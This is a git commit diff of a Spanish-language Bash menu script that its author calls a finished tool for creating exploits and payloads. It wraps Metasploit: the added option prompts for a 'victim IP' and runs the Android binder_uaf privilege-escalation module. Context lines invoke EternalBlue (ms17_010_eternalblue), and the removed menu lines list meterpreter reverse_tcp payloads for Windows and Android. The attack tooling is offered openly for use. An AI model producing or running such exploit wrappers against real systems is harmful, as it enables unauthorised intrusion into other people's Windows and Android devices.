c4373334345d0ccbb87fc53d95e75bcb815d2271
ilia-arcas-jimenez <72982833+ilia-arcas-jimenez@users.noreply.github.com>
2020-10-19 15:51:40 +0000

    Actualizacion
    Aqui actualize el archivo y lo acabe por completo 
    El proyecto esta completamente acabado
    Disfruten de mi herramienta

--- projecto_de_explotacion/PRUEBAS/PruebaFinal.sh
+++ projecto_de_explotacion/PRUEBAS/PruebaFinal.sh
@@ -1,7 +1,38 @@
 #!/bin/bash
 
 #Programa final de creacion de exploit y payload
+#Este programa esta acabado completamente aunque si hay algun problema con el por cualquier cosa  como errores que puede que haya cometido pero no se vean a simple vista comentarlo en github y asi lo arreglare y tambien ayudara a mi aprendizaje sobre el BASH
+#Saludos desde España 
 #ilia
+
+
+
+
+
+
+
+
+
+echo "\e[1;31m██████████████         ███                █████████████████                ███              \e[0m"                                                  
+echo "\r[1;31m██████████████         ███                █████████████████               █████             \r[0m"                                                
+echo "\e[1;31m      ███              ███                       ███                     ███ ███            \e[0m"                
+echo "\r[1;31m      ███              ███                       ███                    ███   ███           \r[0m"              
+echo "\e[1;31m      ███              ███                       ███                   ███     ███          \e[0m"
+echo "\r[1;31m      ███              ███                       ███                  █████████████         \r[0m"                       
+echo "\e[1;31m      ███              ███                       ███                 ███████████████        \e[0m"         
+echo "\r[1;31m      ███              ███                       ███                ███            ███       \r[0m"
+echo "\e[1;31m██████████████         ███████████        █████████████████        ███              ███     \e[0m"                   
+echo "\r[1;31m██████████████         ███████████        █████████████████       ███                ███    \r[0m"                          
+
+echo  "Esta es l aprueba final y absoluta la cual esta completamente acabada y pulida.
+Espero que les guste mi proyecto
+Saludos "
+
+
+
+
+
+
 trap ctrl_c INT
 function ctrl_c() {
     echo -e "\e[0;31m SALIENDO \e[0m"
@@ -18,10 +49,11 @@ while :
 do 
 opcion=0
 echo
-echo -e "\e[1;33m   [1]\e[0m \e[1;34mwindows/meterpreter/reverse_tcp\e[0m"
-echo -e "\e[1;33m   [2]\e[0m \e[1;34mandroid/meterpreter/reverse_tcp\e[0m"
-echo -e "\e[1;33m   [3]\e[0m \e[1;34mwindows/shell/reverse_tcp\e[0m"
-echo -n -e "\e[1;37m ELIJE UNA OPCION :\e[0m"
+echo -e "\e[1;33m   [1]\e[0m \e[1;34mWINDOWS PAYLOAD\e[0m"
+echo -e "\e[1;33m   [2]\e[0m \e[1;34mANDROID PAYLOAD\e[0m"
+echo -e "\e[1;33m   [3]\e[0m \e[1;34mWINDOWS EXPLOIT\e[0m"
+echo -e "\e[1;33m   [4]\e[0m \e[1;34mANDROID EXPLOIT\e[0m"
+echo -e "\e[1;33m   [5]\e[0m \e[1;34mSALIR\e[0m"
 read opcion
 case $opcion in 
 1)
@@ -96,7 +128,25 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                 exploit"
 read enterkey
 ;;
-8)
+4)
+sleep 5s
+echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
+read IP
+sleep 2s
+echo -n -e "\e[1;33mSESSION :\e[0m"
+read NUMERO
+sleep 2s 
+sudo service postgresql start
+sleep 2s
+clear
+sleep 4s
+msfconsole -x "use exploit/android/local/binder_uaf;\
+                set SESSION $NUMERO;\
+                set LHOST $IP;\
+                run" 
+read enterkey
+;;
+5)
 clear
 exit 0
 read enterkey
@@ -107,6 +157,9 @@ echo -e "\e[1;37mLa opcion\e[0m \e[1;33m[$opcion]\e[0m \e[1;37mno esta en la lis
 read enterkey
 ;;
 esac
+
+echo "Gracias por usar esta herramienta"
+sleep 4s
 done
 
 
